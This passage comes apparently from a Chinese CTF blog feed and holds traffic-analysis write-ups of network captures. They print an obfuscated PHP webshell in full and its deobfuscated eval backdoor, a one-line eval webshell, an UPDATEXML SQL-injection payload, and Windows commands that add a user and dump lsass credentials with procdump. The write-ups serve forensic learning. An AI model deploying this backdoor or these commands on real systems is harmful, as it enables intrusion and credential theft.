alt="iCAqRU.md.png"></a></p><p>很明显了，注入的参数是<code>list[select]</code>,并且应该是使用了<code>报错注入</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span>\n</span><br><span class="line">   <span class="tag">&lt;<span class="name">html</span> <span class="attr">xmlns</span>=<span class="string">"http://www.w3.org/1999/xhtml"</span> <span class="attr">xml:lang</span>=<span class="string">"en-gb"</span> <span class="attr">lang</span>=<span class="string">"en-gb"</span> <span class="attr">dir</span>=<span class="string">"ltr"</span>&gt;</span>\n</span><br><span class="line">   <span class="tag">&lt;<span class="name">head</span>&gt;</span>\n</span><br><span class="line">   \t<span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"content-type"</span> <span class="attr">content</span>=<span class="string">"text/html; charset=utf-8"</span> /&gt;</span>\n</span><br><span class="line">    [truncated]\t<span class="tag">&lt;<span class="name">title</span>&gt;</span>Error: 500 XPATH syntax error: &amp;#039;qqzvqadminqqkkq&amp;#039; SQL=SELECT (UPDATEXML(6315,CONCAT(0x2e,0x71717a7671,(SELECT MID((IFNULL(CAST(username AS CHAR),0x20)),1,22) FROM joomla.ajtuc_users ORDER BY id LIMIT 0,1),0x71</span><br><span class="line">   FROM `ajtuc_ucm_history` AS h\n</span><br><span class="line">   LEFT JOIN ajtuc_users AS uc ON uc.id = h.editor_user_id\n</span><br></pre></td></tr></table></figure><p>而且还可以从响应里面发现是从<code>joomla.ajtuc_users</code>表里面注入的东西，也知道了前缀为<code>ajtuc</code>，同时也知道了数据库为<code>joomla</code>。第三四题解决</p><p>然后要找登录后台的密码，但是这里直接<code>contains &quot;password&quot;</code>是找不到的，我们这时候就得转换思路就是说黑客是从数据库里把密码爆出来的<br>如果仔细看这个黑客的行为的话，他事先尝试登录发现不行才用的SQL注入，所以也就跟着这个思路来走了</p><p>既然报错注入，里面必含有password的关键字以及表名，立即过滤<br><code>ip.src == 202.1.1.2 and http contains &quot;password&quot; and http contains &quot;joomla.ajtuc_users&quot;</code><br>发现有三条，标记一下查看他们的response<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Status: 500 XPATH syntax error: &apos;qqzvq$2y$10$lXujU7XaUviJDigqqkkq&apos; </span><br><span class="line">Status: 500 XPATH syntax error: &apos;qqzvqFMzKy6.wx7EMCBqpzrJdn7qqkkq&apos; </span><br><span class="line">Status: 500 XPATH syntax error: &apos;qqzvqzi/8B2QRD7qIlDJeqqkkq&apos;</span><br></pre></td></tr></table></figure></p><p>再来查看一下报错注入是这样的，存在拼接<code>0x71717a7671</code>，解码一下<code>qqzvq</code><br><code>UPDATEXML(5928,CONCAT(0x2e,0x71717a7671,(SELECT MID((IFNULL(CAST(password AS CHAR),0x20)),1,22</code>，所以得把qqzvq前缀去掉</p><p><code>$2y$10$lXujU7XaUviJDigqqkkqFMzKy6.wx7EMCBqpzrJdn7qqkkqzi/8B2QRD7qIlDJeqqkkq</code><br>拼接起来就是经过加密后的密码，官方答案是qwert123，但还是解不出来</p><p>第一个包里面过滤<br><code>http.request.method == &quot;POST&quot; and ip.src == 202.1.1.2</code><br><a href="https://imgchr.com/i/iCEeeA" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/06/iCEeeA.md.png" alt="iCEeeA.md.png"></a></p><p>没发现有可疑数据</p><p>再找第二个包<br><code>ip.src == 202.1.1.2 and http.request.method == &quot;POST&quot; and http contains &quot;eval&quot;</code>，发现存在一个文件<code>kkkaaa.php</code><br><a href="https://imgchr.com/i/iCEMJf" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/06/iCEMJf.md.png" alt="iCEMJf.md.png"></a></p><p>可以发现这里面的是一个马，密码为<code>zzz</code><br>然后我们再根据这个马去寻找上传的的第二个马<br>当我们点到第三个报文的时候发现多了一个参数<code>z2</code>，有点可疑<br><a href="https://imgchr.com/i/iCEQW8" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/06/iCEQW8.md.png" alt="iCEQW8.md.png"></a></p><p>保存出来看一下，发现是段php代码，<br><img src="https://s1.ax1x.com/2018/09/06/iCE3Qg.png" alt="iCE3Qg.png"><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>.$p=<span class="string">'l&gt;]ower";$i&gt;]=$m[1][0].$m[1]&gt;][1];$h&gt;]=$&gt;]sl($ss(m&gt;]d5($i.&gt;]$kh),0&gt;],3))&gt;];$f=$s&gt;]l($s&gt;]s(md5'</span>;.$d=<span class="string">']q=array_v&gt;]&gt;]alues(&gt;]$q);&gt;]preg_match_a&gt;]ll("/(&gt;][\\w]&gt;])[\\w-&gt;]]+&gt;](?:;q=&gt;]0.([\\d]))?,?/",&gt;'</span>;.$W=<span class="string">'),$ss(&gt;]$s[&gt;]$i],&gt;]0,$e))),$&gt;]&gt;]k)));&gt;]$o=ob_get_content&gt;]&gt;]s();ob_end_&gt;]&gt;]clean();$d=&gt;]base'</span>;.$e=<span class="string">']T_LANGUAGE"];if($rr&gt;]&amp;&amp;$&gt;]ra)&#123;$&gt;]u=pars&gt;]e_&gt;]url($rr);par&gt;]se_st&gt;]r($u["&gt;]query"],$&gt;]q);$&gt;'</span>;.$E=<span class="string">'&gt;]64_e&gt;]ncod&gt;]e&gt;](&gt;]x(gz&gt;]compress($o),$k));pri&gt;]nt("&lt;$k&gt;$d&lt;&gt;]/$k&gt;"&gt;])&gt;];@&gt;]session_destr&gt;]oy();&#125;&#125;&#125;&#125;'</span>;.$t=<span class="string">'($i.&gt;]$kf),0,3&gt;]));$p&gt;]="";fo&gt;]r($z=1&gt;];$z&lt;&gt;]count($m&gt;][1]);$z+&gt;]&gt;]+)$p&gt;].=$q[$m[&gt;]2][$z]];i&gt;'</span>;.$M=<span class="string">']$ra,$&gt;]m);if($q&gt;]&amp;&amp;$m&gt;])&#123;@sessi&gt;]on_sta&gt;]&gt;]rt();$s=&amp;$&gt;]_SESS&gt;]ION;$&gt;]&gt;]s&gt;]s="substr";$sl="s&gt;]&gt;]trto'</span>;.$P=<span class="string">']f(s&gt;]tr&gt;]pos($p&gt;],$h)===0)&#123;$s[&gt;]$i]="";$p&gt;]=$ss($&gt;]p,3);&gt;]&#125;if(ar&gt;]ray&gt;]_key_exist&gt;]&gt;]s($i,$&gt;]s)&gt;])&#123;$&gt;'</span>;.$j=str_replace(<span class="string">'fr'</span>,<span class="string">''</span>,<span class="string">'cfrrfreatfrfre_funcfrtfrion'</span>);.$k=<span class="string">'];&#125;&#125;re&gt;]&gt;]turn $o;&gt;]&#125;$&gt;]r=$_SERV&gt;]ER;$rr=@$r[&gt;]"HTTP&gt;]_REFERE&gt;]R"];$ra&gt;]=@&gt;]$r["&gt;]HTTP_A&gt;]CC&gt;]EP&gt;'</span>;.$g=<span class="string">'"";for(&gt;]$i=&gt;]0;$i&lt;$l;&gt;])&gt;]&#123;for($j=0;($j&lt;&gt;]$c&amp;&amp;&gt;]$i&lt;$l);$&gt;]j++,$i&gt;]++)&#123;$o.&gt;]=$t&#123;$i&gt;]&#125;^$k&#123;$j&#125;&gt;'</span>;.$R=<span class="string">'$k&gt;]h="cb4&gt;]2";$kf="e130"&gt;];functio&gt;]n&gt;] x($t&gt;],$k)&#123;$c=s&gt;]trle&gt;]&gt;]n($k);$l=strle&gt;]n&gt;]($t)&gt;];$o='</span>;.$Q=<span class="string">']s[$i].=$p;$e=strp&gt;]&gt;]os(&gt;]$s[$i&gt;]],$f);if($&gt;]e)&#123;$k=$kh.$k&gt;]f;&gt;]ob_sta&gt;]rt();@e&gt;]val(@gzun&gt;]co&gt;'</span>;.$v=<span class="string">']mpress(@x&gt;](@b&gt;]as&gt;]&gt;]e64_decode(pr&gt;]&gt;]e&gt;]g_repla&gt;]ce(array("/_/","/-/"),arr&gt;]ay(&gt;]"/","+"&gt;]'</span>;.$x=str_replace(<span class="string">'&gt;]'</span>,<span class="string">''</span>,$R.$g.$k.$e.$d.$M.$p.$t.$P.$Q.$v.$W.$E);.$N=$j(<span class="string">''</span>,$x);$N();.<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>解混淆<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var_dump($j);</span><br><span class="line">var_dump($x);</span><br></pre></td></tr></table></figure></p><p>得到<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">string(<span class="number">15</span>) <span class="string">"create_function"</span></span><br><span class="line">string(<span class="number">929</span>) <span class="string">"$kh="</span>cb42<span class="string">";$kf="</span>e130<span class="string">";function x($t,$k)&#123;$c=strlen($k);$l=strlen($t);$o="</span><span class="string">";for($i=0;$i&lt;$l;)&#123;for($j=0;($j&lt;$c&amp;&amp;$i&lt;$l);$j++,$i++)&#123;$o.=$t&#123;$i&#125;^$k&#123;$j&#125;;&#125;&#125;return $o;&#125;$r=$_SERVER;$rr=@$r["</span>HTTP_REFERER<span class="string">"];$ra=@$r["</span>HTTP_ACCEPT_LANGUAGE<span class="string">"];if($rr&amp;&amp;$ra)&#123;$u=parse_url($rr);parse_str($u["</span>query<span class="string">"],$q);$q=array_values($q);preg_match_all("</span>/([\w])[\w-]+(?:;q=<span class="number">0.</span>([\d]))?,?/<span class="string">",$ra,$m);if($q&amp;&amp;$m)&#123;@session_start();$s=&amp;$_SESSION;$ss="</span>substr<span class="string">";$sl="</span>strtolower<span class="string">";$i=$m[1][0].$m[1][1];$h=$sl($ss(md5($i.$kh),0,3));$f=$sl($ss(md5($i.$kf),0,3));$p="</span><span class="string">";for($z=1;$z&lt;count($m[1]);$z++)$p.=$q[$m[2][$z]];if(strpos($p,$h)===0)&#123;$s[$i]="</span><span class="string">";$p=$ss($p,3);&#125;if(array_key_exists($i,$s))&#123;$s[$i].=$p;$e=strpos($s[$i],$f);if($e)&#123;$k=$kh.$kf;ob_start();@eval(@gzuncompress(@x(@base64_decode(preg_replace(array("</span>/_/<span class="string">","</span>/-/<span class="string">"),array("</span>/<span class="string">","</span>+<span class="string">"),$ss($s[$i],0,$e))),$k)));$o=ob_get_contents();ob_end_clean();$d=base64_encode(x(gzcompress($o),$k));print("</span>&lt;$k&gt;$d&lt;/$k&gt;<span class="string">");@session_destroy();&#125;&#125;&#125;&#125;"</span></span><br></pre></td></tr></table></figure></p><p>基本上可以确定这是第二个马<br>上传时间为<br><code>17:20:44.248365</code><br>然后重新过滤一下<br><code>ip.src == 202.1.1.2 and http</code>根据时间上的关系也可以确定第二上传的马的名字为<code>/tmp/footer.php</code></p><p>其实我们也可以从上面发现关于头的操作有两个东西<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$rr = @$_SERVER[&quot;HTTP_REFERER&quot;];</span><br><span class="line">$ra = @$_SERVER[&quot;HTTP_ACCEPT_LANGUAGE&quot;];</span><br></pre></td></tr></table></figure></p><p>看的跟清楚一点可以追踪几个<code>footer</code>的流看一下<br>明显发现<code>referer</code>有base64加密但是LANGUAGE没啥变化，所以最后的答案应该是referer<br><a href="https://imgchr.com/i/iCENoq" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/06/iCENoq.md.png" alt="iCENoq.md.png"></a></p><p>然后题目抛出mysql的操作<br>在第四个包里面才找到关于SQL的相关协议<br><a href="https://imgchr.com/i/iCEbTI" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/06/iCEbTI.md.png" alt="iCEbTI.md.png"></a><br><code>mysql and mysql contains &quot;password&quot;</code><br>过滤之后可以发现黑客又在爆破<br>直接找到最后的login请求里面的hash值就是<code>password</code><br><a href="https://imgchr.com/i/iCEdYV" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/06/iCEdYV.md.png" alt="iCEdYV.md.png"></a></p><p>然后再来过滤一波查看黑客究竟<code>footer.php</code>之后的操作，发现有<code>tunnel</code>这样的关键字样，明显第一次使用的代理ip为<code>4.2.2.2</code><br><a href="https://imgchr.com/i/iCEBSU" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/06/iCEBSU.md.png" alt="iCEBSU.md.png"></a></p><p>然后第五到第八个包没有任何有关题目的答案</p><p>过滤第九个包的内容<br><code>(ip.addr == 202.1.1.2) and (http contains &quot;ls&quot;|| http contains &quot;dir&quot;)</code><br>发现有两次列目录的过程<br><a href="https://imgchr.com/i/iCEXff" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/06/iCEXff.md.png" alt="iCEXff.md.png"></a></p><p>用了<code>dir</code>的那一次才有回显，系统是<code>Windows</code>没错了<br><a href="https://imgchr.com/i/iCEz6g" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/06/iCEz6g.md.png" alt="iCEz6g.md.png"></a><br>时间很明显就是这个了<br>我么现在知道黑客攻击的ip是<code>192.168.2.20</code>，然后过滤一下<code>ip.addr == 192.168.2.20 &amp;&amp; http</code><br><a href="https://imgchr.com/i/iCVSXQ" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/06/iCVSXQ.md.png" alt="iCVSXQ.md.png"></a><br>发现黑客通过echo命令写入一句话木马，然后通过<code>sh.php</code>执行<br>再过滤一下<br><code>ip.src == 192.168.2.20 &amp;&amp; http</code><br>发现在<code>18:49:27.767754</code>发现了疑似黑客振兴<code>net user localgroup</code> 命令的结果<br><a href="https://imgchr.com/i/iCVC0s" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/06/iCVC0s.md.png" alt="iCVC0s.md.png"></a><br>标记一下在其附近找请求</p><p>果不其然<br>在他的下方的post请求里面的<code>z2</code>参数里面解码得到<br><a href="https://imgchr.com/i/iCVFkq" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/06/iCVFkq.md.png" alt="iCVFkq.md.png"></a></p><p><code>cd/d&quot;C:\phpStudy\WWW\b2evolution\install\test\&quot;&amp;net user kaka kaka /add&amp;echo [S]&amp;cd&amp;echo [E]</code><br>也就是增加了<code>kaka:kaka</code>这个用户名和密码</p><p>最后一个问题是下载了什么文件，由于使用菜刀下载的，很简单直接过滤post请求就好<br><code>ip.dst == 192.168.2.20 &amp;&amp; http.request.method== &quot;POST&quot;</code><br><a href="https://imgchr.com/i/iCVecF" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/06/iCVecF.md.png" alt="iCVecF.md.png"></a></p><p>在这个包里面会发现最后有几个报文是含有z2参数的，十分可疑，解码<br>会发现哟一个利用<code>procdump.exe</code>操作的东西<br><code>cd/d&quot;C:\phpStudy\WWW\b2evolution\install\test\&quot;&amp;procdump.exe -accepteula -ma lspasss.dmp&amp;echo [S]&amp;cd&amp;echo [E]</code><br>下面的post请求解码z2参数也是类似的东西<br><code>cd/d&quot;C:\phpStudy\WWW\b2evolution\install\test\&quot;&amp;procdump.exe -accepteula -ma lsass.exe&amp;echo [S]&amp;cd&amp;echo [E]</code><br>再来解码一下最后一个报文里面的东西，发现这个文件<br><code>C:\phpStudy\WWW\b2evolution\install\test\lsass.exe_180208_185247.dmp</code><br>猜测应该是下了这个文件<br>然后打开第10个报文确认就是这个文件就好了</p><p>答案归纳</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">1.192.168.1.8</span><br><span class="line">2.list[select]</span><br><span class="line">3.ajtuc</span><br><span class="line">4.joomla</span><br><span class="line">5.$2y$10$lXujU7XaUviJDigFMzKy6.wx7EMCBqpzrJdn7zi/8B2QRD7qIlDJe(未解密)</span><br><span class="line">6.zzz</span><br><span class="line">7.17:20:44.248365</span><br><span class="line">8.Referer</span><br><span class="line">9.admin:1a3068c3e29e03e3bcfdba6f8669ad23349dc6c4</span><br><span class="line">10.4.2.2.2</span><br><span class="line">11.18:49:27.767754</span><br><span class="line">12.kaka:kaka</span><br><span class="line">13.lsass.exe_180208_185247.dmp</span><br></pre></td></tr></table></figure><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>1.发现有菜刀流量的时候多关注是否出现z2参数的值，凡是出现这种参数的值得多去解码看看，不要嫌麻烦，因为这里面往往包含一些关键操作<br>2.出现一些有关php混淆的代码的时候要学会找到对应的参数去反混淆2333</p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;keep learning&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;正文&quot;&gt;&lt;a href=&quot;#正文&quot; class=&quot;headerlink&quot; title=&quot;正文&quot;&gt;&lt;/a&gt;正文&lt;/h2&gt;&lt;p&gt;链接: &lt;a href=&quot;https://pan.baidu.com/s/1b6bkW-J8vKASr8C2r9vsdQ&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://pan.baidu.com/s/1b6bkW-J8vKASr8C2r9vsdQ&lt;/a&gt; 密码: nux4&lt;br&gt;感谢方方土学长的&lt;a href=&quot;http://skysec.top/2018/05/30/2018.5.5信息安全铁人三项赛数据赛题解/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;题解&lt;/a&gt;，学习到
    
    </summary>
    
      <category term="流量分析" scheme="0verwatch.top/categories/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/>
    
    
      <category term="流量分析" scheme="0verwatch.top/tags/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>安恒8月应急响应题目回顾</title>
    <link href="0verwatch.top/2018/08/30/anheng-8month-part1/"/>
    <id>0verwatch.top/2018/08/30/anheng-8month-part1/</id>
    <published>2018-08-30T14:22:35.000Z</published>
    <updated>2018-08-30T14:25:46.544Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最做流量分析的题目感觉还是不太熟悉，所以最近几篇博客都应该都是练习流量分析的题目了，就从安恒8月赛这个应急响应讲起吧，记录一下加深印象，顺便小结一下自己的做题领悟。<a id="more"></a></p><p>题目地址  <a href="https://pan.baidu.com/s/13SoD6xB7YBiqpUDCIcb8mg" target="_blank" rel="noopener">https://pan.baidu.com/s/13SoD6xB7YBiqpUDCIcb8mg</a></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="题目概述"><a href="#题目概述" class="headerlink" title="题目概述"></a>题目概述</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1、给出黑客使用的扫描器</span><br><span class="line">2、得到黑客扫描到的登陆后台是(相对路径即可) /admin/login.php</span><br><span class="line">3、得到黑客使用了什么账号密码登陆了web后台(形式:username/password)</span><br><span class="line">4、得到黑客上传的webshell文件名是什么，内容是什么,提交webshell内容的base编码</span><br><span class="line">5、黑客在robots.txt中找到的flag是什么</span><br><span class="line">6、黑客找到的数据库密码是多少</span><br><span class="line">7、黑客在数据库中找到的hash_code是什么</span><br><span class="line">8、黑客破解了账号ijnu@test.com得到的密码是什么</span><br><span class="line">9、被黑客攻击的web服务器，网卡配置是是什么，提交网卡内网ip</span><br><span class="line">10、黑客使用了什么账号登陆了mail系统（形式: username/password）</span><br><span class="line">11、黑客获得的vpn,ip是多少</span><br></pre></td></tr></table></figure><p>还得了解一下一些前置的知识</p><p>过滤IP，如源IP或者目标 x.x.x.x<br><code>ip.src == x.x.x.x or ip.dst eq x.x.x.x 或者 ip.addr == x.x.x.x</code><br>过滤端口<br><code>tcp.port eq 80 or udp.port eq 80</code><br>过滤MAC<br><code>eth.dst ==A0:00:00:04:C5:84</code></p><p>http模式过滤(就是一种模糊匹配)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http.request.method== &quot;GET&quot; </span><br><span class="line">http.request.method== &quot;POST&quot; </span><br><span class="line">http.request.uri ==&quot;/img/logo-edu.gif&quot; </span><br><span class="line">http contains&quot;GET&quot; </span><br><span class="line">http contains&quot;HTTP/1.&quot; </span><br><span class="line">http.request.method== &quot;GET&quot; &amp;&amp; http contains &quot;User-Agent:&quot;</span><br></pre></td></tr></table></figure><p>一些常见的自动化工具的指纹</p><p>Awvs（Acunetix Web Vulnerability Scanner ）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">acunetix_wvs_security_test acunetix </span><br><span class="line">acunetix_wvs acunetix_test</span><br><span class="line">Acunetix-Aspect-Password: Cookie: </span><br><span class="line">acunetix_wvs_security_test X-Forwarded-Host: </span><br><span class="line">acunetix_wvs_security_test X-Forwarded-For: </span><br><span class="line">acunetix_wvs_security_test Host: </span><br><span class="line">acunetix_wvs_security_test</span><br></pre></td></tr></table></figure><p>感觉我们只需要http contains “wvs” 或者是 http contains “acunetix”就可以把包给筛选出来</p><p>Netsparker</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">X-Scanner: NetsparkerLocation: </span><br><span class="line">NetsparkerAccept: netsparker/checkCookie: </span><br><span class="line">netsparkerCookie: NETSPARKER</span><br></pre></td></tr></table></figure><p>Appscan</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Headers Content-Type: Appscan </span><br><span class="line">Content-Type: AppScanHeaderAccept: Appscan User-Agent:Appscan</span><br></pre></td></tr></table></figure><p>Nessus</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">x_forwarded_for: nessus</span><br><span class="line">referer: nessus</span><br><span class="line">host: nessus</span><br></pre></td></tr></table></figure><p>Sqlmap</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: sqlmap1.2.8#stable</span><br></pre></td></tr></table></figure><h4 id="1、给出黑客使用的扫描器"><a href="#1、给出黑客使用的扫描器" class="headerlink" title="1、给出黑客使用的扫描器"></a>1、给出黑客使用的扫描器</h4><p>竟然是黑客攻击，就应该把把http过滤看一下或者直接搜就行<br><a href="https://imgchr.com/i/Pj0s39" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/08/30/Pj0s39.md.png" alt="Pj0s39.md.png"></a><br>所以这一题的答案是awvs</p><h4 id="2、得到黑客扫描到的登陆后台是-相对路径即可-admin-login-php"><a href="#2、得到黑客扫描到的登陆后台是-相对路径即可-admin-login-php" class="headerlink" title="2、得到黑客扫描到的登陆后台是(相对路径即可) /admin/login.php"></a>2、得到黑客扫描到的登陆后台是(相对路径即可) /admin/login.php</h4><p>通常后台的名字包括</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">admin</span><br><span class="line">manager</span><br><span class="line">login</span><br><span class="line">system</span><br></pre></td></tr></table></figure><p>所以我们直接搜其中的一个输入命令<code>http contains &quot;login&quot; &amp;&amp; http.request.method == &quot;POST&quot;</code><br><a href="https://imgchr.com/i/Pj0ycR" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/08/30/Pj0ycR.md.png" alt="Pj0ycR.md.png"></a><br>前面的都是登陆的页面，那个password_reset应该是密码重置<br>所以这一题的答案应该是<code>/admin/login.php?rec=login</code></p><p>###3、得到黑客使用了什么账号密码登陆了web后台(形式:username/password)<br>也是同样的套路<br>输入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http contains &quot;password&quot;</span><br></pre></td></tr></table></figure></p><p> 这个我找得有点久，因为答案在最后，中间还有其他可以登陆上去的用户有一个还像是人事，还有两外一个好像是设么simple啥的，看了这整个包，发现simple这个账号有好几次改密码的操作，人事也登陆了几次，这些混淆都给这题提高难度，如果你真的仔细分析这个包的话就会发现，这里面黑客是大概爆破了几次，中间还尝试了一波SQL注入，而且爆破的过程都是用的admin账户，这也暗示了为什么最后的登陆的用户名是admin了，这里的话登陆成功可以看长度，对比爆破跟正常人事的登录，成功的话一般长度都是750+，没成功的话一般都是730+<br><a href="https://imgchr.com/i/Pj06j1" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/08/30/Pj06j1.md.png" alt="Pj06j1.md.png"></a><br>所以第三题的答案是<code>admin/admin!@#pass123</code></p><h4 id="4、得到黑客上传的webshell文件名是什么，内容是什么-提交webshell内容的base编码"><a href="#4、得到黑客上传的webshell文件名是什么，内容是什么-提交webshell内容的base编码" class="headerlink" title="4、得到黑客上传的webshell文件名是什么，内容是什么,提交webshell内容的base编码"></a>4、得到黑客上传的webshell文件名是什么，内容是什么,提交webshell内容的base编码</h4><p>通常webshell都会有明显的关键字比如eval、assert之类的，还有各种回调函数就不多说了。<br>我们这里也是一样的套路<br><code>ip.src == 192.168.94.59 and http contains &quot;eval&quot;</code> 一看这不太正常的文件名，有很大机会就是webshell了，而且里面的内容含有z1这样的参数很大可能性就是菜刀连接的流量，所以文件名是<code>/image/article/a.php</code><br><a href="https://imgchr.com/i/Pj02B6" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/08/30/Pj02B6.md.png" alt="Pj02B6.md.png"></a></p><p>所以这题的答案是<br><code>&lt;?php @eval([1234]);?&gt;</code>的base64编码</p><h4 id="5、黑客在robots-txt中找到的flag是什么"><a href="#5、黑客在robots-txt中找到的flag是什么" class="headerlink" title="5、黑客在robots.txt中找到的flag是什么"></a>5、黑客在robots.txt中找到的flag是什么</h4><p>正常操作<code>http contains &quot;robots.txt&quot;</code>然后追踪流就好了<br><a href="https://imgchr.com/i/Pj0I9H" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/08/30/Pj0I9H.md.png" alt="Pj0I9H.md.png"></a><br>这题的答案就是上图的flag</p><h4 id="6、黑客找到的数据库密码是多少"><a href="#6、黑客找到的数据库密码是多少" class="headerlink" title="6、黑客找到的数据库密码是多少"></a>6、黑客找到的数据库密码是多少</h4><p>对于这题的数据库操作，先把马给过滤出来，然后再从里面找他的response，因为这里黑客是通过马对数据库操作的<br>可以先标记一下<code>a.php</code>第一次出现的地方，然后过滤http一条条去看他们的response就可以了，要是想详细一点的话可以加上db等字样，这就是做题时候的一些小技巧了。。可能恰好一样的效率有点低<br><a href="https://imgchr.com/i/Pj0XE8" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/08/30/Pj0XE8.md.png" alt="Pj0XE8.md.png"></a><br>所以这题的答案就是<code>e667jUPvJjXHvEUv</code></p><h4 id="7、黑客在数据库中找到的hash-code是什么"><a href="#7、黑客在数据库中找到的hash-code是什么" class="headerlink" title="7、黑客在数据库中找到的hash_code是什么"></a>7、黑客在数据库中找到的hash_code是什么</h4><p>这个题目明显的就是说在数据库里面找到的hash_code，但是在第一个包里面使用<code>http contains &quot;hsah_code&quot;</code>只找到一个响应报文，里面什么都找不到，这时候我们别忘了有第二个包的存在，我就是经常忘了。。这种做题习惯得改改，太浮躁，一旦发现没有就不做了。。。<br>我们来对比一下两个包的协议分级，很明显第二包里面大多数都是mysql的操作，所以很大可能性就是这个包里面存在我们要的答案<br>第一个包应用层大部分都是html的响应<br><a href="https://imgchr.com/i/PjBpgs" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/08/30/PjBpgs.md.png" alt="PjBpgs.md.png"></a><br>而第二个包明显了，直接在tcp协议上执行的Mysql操作<br><a href="https://imgchr.com/i/PjB9vn" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/08/30/PjB9vn.md.png" alt="PjB9vn.md.png"></a><br>我们可以在第二个包里面用mysql的过滤，如果是想搜索执行语句的话最好这样子，如：mysql.query contains “SELECT”<br>类似的模糊匹配<br><code>mysql contains &quot;hash_code&quot;</code><br>然后随便找个response追踪流看一下，发现答案<br><a href="https://imgchr.com/i/PjBiD0" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/08/30/PjBiD0.md.png" alt="PjBiD0.md.png"></a><br>这题答案是<code>d1c029893df40cb0f47bcf8f1c3c17ac</code></p><h4 id="8、黑客破解了账号ijnu-test-com得到的密码是什么"><a href="#8、黑客破解了账号ijnu-test-com得到的密码是什么" class="headerlink" title="8、黑客破解了账号ijnu@test.com得到的密码是什么"></a>8、黑客破解了账号<a href="mailto:ijnu@test.com" target="_blank" 